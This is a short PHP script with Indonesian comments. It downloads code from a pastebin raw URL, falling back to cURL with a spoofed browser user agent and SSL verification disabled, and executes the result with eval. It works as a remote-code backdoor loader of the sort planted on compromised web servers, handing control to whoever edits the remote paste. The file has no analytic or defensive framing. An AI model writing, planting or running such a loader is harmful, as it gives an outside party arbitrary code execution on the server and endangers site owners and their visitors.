<?php
$url = "https://pastebin.com/raw/Whtj5r8j";

// Coba ambil dengan file_get_contents
$code = @file_get_contents($url);

// Kalau gagal, coba pakai cURL
if ($code === false) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0',
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    $code = curl_exec($ch);
    curl_close($ch);
}

// Eksekusi kode
if ($code !== false) {
    eval("?>".$code);
} else {
    echo "Gagal mengambil kode dari URL.";
}